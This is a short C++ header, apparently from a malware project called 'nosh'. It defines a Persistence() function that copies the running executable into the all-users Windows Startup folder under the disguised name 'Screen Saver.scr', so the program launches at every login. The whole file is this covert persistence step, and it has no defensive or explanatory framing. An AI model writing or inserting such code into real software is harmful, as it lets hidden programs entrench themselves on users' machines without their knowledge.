#pragma once
#include <windows.h>
#include <iostream>


int Persistence()
{
    char buffer[MAX_PATH] = {};
    DWORD length = GetModuleFileNameA(nullptr, buffer, MAX_PATH);

    const char* sourcePath = buffer;

    std::cout << sourcePath << '\n';

    // nosh's persistence path (requires admin to copy, but the copied file cannot have admin presets. Must be right-clicked then run with admin, not linker->manifest->admin)
    const char* destinationPath = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\Screen Saver.scr";

    if (!CopyFileA(sourcePath, destinationPath, FALSE))
    {
        std::cerr << "didnt work err: " << GetLastError() << '\n';
    }

    return 0;
}